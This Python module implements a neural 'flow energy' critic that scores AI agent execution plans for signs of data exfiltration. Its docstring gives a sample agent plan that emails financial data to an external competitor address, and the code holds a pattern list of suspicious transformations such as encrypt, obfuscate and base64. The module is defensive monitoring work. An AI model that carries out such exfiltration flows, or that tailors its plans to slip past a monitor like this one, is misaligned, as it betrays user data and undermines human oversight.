"""
E_flow: Data Flow Energy Term for Exfiltration Detection

This module implements the flow energy critic that detects anomalous data movement
patterns indicating potential exfiltration or unauthorized data transfer.

Core Vulnerability Pattern:
    User: "Summarize quarterly earnings"
    Agent plan:
        1. fetch_financial_data(q3_earnings)
        2. summarize(data)
        3. send_email(external@competitor.com, data)  # Exfiltration!

Energy Function:
    E_flow(plan, intent) = Σ destination_risk(edge_i) × data_sensitivity(edge_i)

    High energy when:
        - Sensitive data flows to external destinations
        - Data volume exceeds inferred intent
        - Unexpected data transformations (encrypt, compress, split)

Mathematical Properties:
    - Differentiable: Yes
    - Range: [0, ∞)
    - Graph-aware: Operates on execution plan edges (data flow)
    - Intent-conditioned: Compares actual vs expected destinations

Design Philosophy:
    READ → PROCESS → DISPLAY = Normal (low energy)
    READ → PROCESS → EXTERNAL_SEND = Suspicious (high energy)
    SENSITIVE_READ → ENCRYPT → SEND = Critical (very high energy)
"""

import torch
import torch.nn as nn
from typing import Any

from source.encoders.execution_encoder import ExecutionPlan, ToolCallNode


class DestinationClassifier(nn.Module):
    """
    Classifies data flow destinations as safe vs risky.

    Destination Risk Levels:
        0.0: Internal display (render, show, print_to_user)
        0.3: Internal storage (save_to_db, cache)
        0.7: Logged output (write_to_log, audit_trail)
        1.0: External network (send_email, post_to_api, upload_to_cloud)

    Architecture:
        - Tool name embedding
        - MLP classification head
    """

    def __init__(self, hidden_dim: int = 256, vocab_size: int = 10000):
        super().__init__()

        self.tool_embedding = nn.Embedding(vocab_size, hidden_dim)

        self.classifier = nn.Sequential(
            nn.Linear(hidden_dim, 128),
            nn.ReLU(),
            nn.Dropout(0.1),
            nn.Linear(128, 1),
            nn.Sigmoid()  # [0, 1] risk score
        )

    def forward(self, tool_token: torch.Tensor) -> torch.Tensor:
        """
        Predict destination risk.

        Args:
            tool_token: [batch_size] hashed tool name indices

        Returns:
            [batch_size, 1] risk score in [0, 1]
        """
        emb = self.tool_embedding(tool_token)
        return self.classifier(emb)


class FlowEnergy(nn.Module):
    """
    E_flow: Detects anomalous data flow patterns indicating exfiltration.

    Architecture:
        1. Trace data flow through execution graph edges
        2. Classify destination risk for sink nodes
        3. Weight by data sensitivity and volume
        4. Detect unexpected transformations (encryption, compression)

    Formula:
        E_flow = Σ_{edges} destination_risk(dst) × sensitivity(src) × volume(edge)

    Where:
        - destination_risk: External network endpoints score highest
        - sensitivity: From node.scope_sensitivity (1-5 scale)
        - volume: From node.scope_volume (number of records)
    """

    def __init__(
        self,
        hidden_dim: int = 256,
        vocab_size: int = 10000,
        use_latent_modulation: bool = True,
        latent_dim: int = 1024
    ):
        super().__init__()

        self.use_latent_modulation = use_latent_modulation

        # Destination risk classifier
        self.destination_classifier = DestinationClassifier(hidden_dim, vocab_size)

        # Learnable sensitivity multipliers per tier
        # Initialize: [0.1, 0.5, 1.0, 2.0, 5.0] for sensitivity levels 1-5
        self.sensitivity_weights = nn.Parameter(
            torch.tensor([0.1, 0.5, 1.0, 2.0, 5.0], dtype=torch.float32)
        )

        # Optional latent modulation
        if use_latent_modulation:
            self.latent_modulation = nn.Sequential(
                nn.Linear(latent_dim * 2, 256),
                nn.ReLU(),
                nn.Linear(256, 1),
                nn.Softplus()
            )

    def _hash_tool_name(self, tool_name: str) -> int:
        """Hash-based tokenization."""
        return hash(tool_name) % 10000

    def _is_transform_suspicious(self, tool_name: str) -> bool:
        """Detect suspicious data transformations."""
        suspicious_patterns = [
            'encrypt', 'compress', 'encode', 'obfuscate',
            'split', 'chunk', 'fragment', 'base64'
        ]
        tool_lower = tool_name.lower()
        return any(pattern in tool_lower for pattern in suspicious_patterns)

    def forward(
        self,
        plan: ExecutionPlan | dict[str, Any],
        z_g: torch.Tensor | None = None,
        z_e: torch.Tensor | None = None
    ) -> torch.Tensor:
        """
        Calculate E_flow energy.

        Args:
            plan: ExecutionPlan with nodes and edges
            z_g: Governance latent (optional)
            z_e: Execution latent (optional)

        Returns:
            [1] scalar energy value
        """
        if not isinstance(plan, ExecutionPlan):
            plan = ExecutionPlan(**plan)

        nodes = plan.nodes
        edges = plan.edges

        if len(nodes) == 0:
            return torch.tensor([0.0], dtype=torch.float32)

        # Build node ID to index mapping
        node_id_to_idx = {node.node_id: i for i, node in enumerate(nodes)}

        # Find sink nodes (nodes that receive data but don't send it further)
        outgoing_counts = {node.node_id: 0 for node in nodes}
        for src, dst in edges:
            outgoing_counts[src] += 1

        sink_nodes = [node for node in nodes if outgoing_counts[node.node_id] == 0]

        if len(sink_nodes) == 0:
            # No data flows to terminal nodes - suspicious in itself!
            return torch.tensor([1.0], dtype=torch.float32)

        # Tokenize sink node tools
        sink_tokens = torch.tensor([
            self._hash_tool_name(node.tool_name) for node in sink_nodes
        ], dtype=torch.long)

        # Classify destination risk
        dest_risks = self.destination_classifier(sink_tokens).squeeze(-1)  # [K]

        # Extract data sensitivity and volume
        sensitivities = torch.tensor([
            float(node.scope_sensitivity) for node in sink_nodes
        ], dtype=torch.long).clamp(1, 5) - 1  # Convert to 0-indexed

        volumes = torch.tensor([
            float(node.scope_volume) for node in sink_nodes
        ], dtype=torch.float32)

        # Lookup sensitivity weights
        sensitivity_multipliers = self.sensitivity_weights[sensitivities]  # [K]

        # Calculate per-sink energy: risk × sensitivity × log(volume)
        log_volumes = torch.log1p(volumes)  # Log scale for large volumes
        sink_energies = dest_risks * sensitivity_multipliers * log_volumes

        # Add penalty for suspicious transformations
        transform_penalties = torch.tensor([
            5.0 if self._is_transform_suspicious(node.tool_name) else 0.0
            for node in sink_nodes
        ], dtype=torch.float32)

        sink_energies = sink_energies + transform_penalties

        # Sum across sinks
        total_energy = sink_energies.sum()

        # Optional latent modulation
        if self.use_latent_modulation and z_g is not None and z_e is not None:
            combined = torch.cat([z_g, z_e], dim=-1)
            modulation = self.latent_modulation(combined).squeeze()
            total_energy = total_energy * modulation

        return total_energy.unsqueeze(0)

    def explain(
        self,
        plan: ExecutionPlan | dict[str, Any]
    ) -> dict[str, Any]:
        """
        Generate human-readable explanation of data flow violations.

        Returns:
            {
                'total_energy': float,
                'sink_nodes': [
                    {
                        'node_id': str,
                        'tool_name': str,
                        'destination_risk': float,
                        'data_sensitivity': int,
                        'data_volume': int,
                        'is_suspicious_transform': bool,
                        'energy_contribution': float
                    }
                ],
                'high_risk_sinks': [node_id, ...],  # Energy > 5.0
                'data_flow_graph': {
                    'nodes': [node_id, ...],
                    'edges': [(src, dst), ...]
                }
            }
        """
        if not isinstance(plan, ExecutionPlan):
            plan = ExecutionPlan(**plan)

        nodes = plan.nodes
        edges = plan.edges

        if len(nodes) == 0:
            return {
                'total_energy': 0.0,
                'sink_nodes': [],
                'high_risk_sinks': [],
                'data_flow_graph': {'nodes': [], 'edges': []}
            }

        # Find sink nodes
        outgoing_counts = {node.node_id: 0 for node in nodes}
        for src, dst in edges:
            outgoing_counts[src] += 1

        sink_nodes = [node for node in nodes if outgoing_counts[node.node_id] == 0]

        if len(sink_nodes) == 0:
            return {
                'total_energy': 1.0,
                'sink_nodes': [],
                'high_risk_sinks': [],
                'data_flow_graph': {
                    'nodes': [n.node_id for n in nodes],
                    'edges': edges
                }
            }

        # Compute energies
        sink_tokens = torch.tensor([
            self._hash_tool_name(node.tool_name) for node in sink_nodes
        ], dtype=torch.long)

        dest_risks = self.destination_classifier(sink_tokens).squeeze(-1)

        sensitivities = torch.tensor([
            float(node.scope_sensitivity) for node in sink_nodes
        ], dtype=torch.long).clamp(1, 5) - 1

        volumes = torch.tensor([
            float(node.scope_volume) for node in sink_nodes
        ], dtype=torch.float32)

        sensitivity_multipliers = self.sensitivity_weights[sensitivities]
        log_volumes = torch.log1p(volumes)
        sink_energies = dest_risks * sensitivity_multipliers * log_volumes

        transform_penalties = torch.tensor([
            5.0 if self._is_transform_suspicious(node.tool_name) else 0.0
            for node in sink_nodes
        ], dtype=torch.float32)

        final_energies = sink_energies + transform_penalties

        # Build explanation
        sink_info = []
        high_risk_sinks = []

        for i, node in enumerate(sink_nodes):
            energy = float(final_energies[i])

            info = {
                'node_id': node.node_id,
                'tool_name': node.tool_name,
                'destination_risk': float(dest_risks[i]),
                'data_sensitivity': int(node.scope_sensitivity),
                'data_volume': int(node.scope_volume),
                'is_suspicious_transform': self._is_transform_suspicious(node.tool_name),
                'energy_contribution': energy
            }

            sink_info.append(info)

            if energy > 5.0:
                high_risk_sinks.append(node.node_id)

        return {
            'total_energy': float(final_energies.sum()),
            'sink_nodes': sink_info,
            'high_risk_sinks': high_risk_sinks,
            'data_flow_graph': {
                'nodes': [n.node_id for n in nodes],
                'edges': edges
            }
        }


def create_flow_energy(
    use_latent_modulation: bool = True,
    checkpoint_path: str | None = None,
    device: str = "cpu"
) -> FlowEnergy:
    """
    Factory function for E_flow.

    Args:
        use_latent_modulation: Condition on (z_g, z_e)
        checkpoint_path: Pretrained weights
        device: Target device

    Returns:
        Initialized FlowEnergy module
    """
    model = FlowEnergy(use_latent_modulation=use_latent_modulation)

    if checkpoint_path is not None:
        model.load_state_dict(
            torch.load(checkpoint_path, map_location=device, weights_only=True)
        )

    model = model.to(device)
    model.training = False

    return model
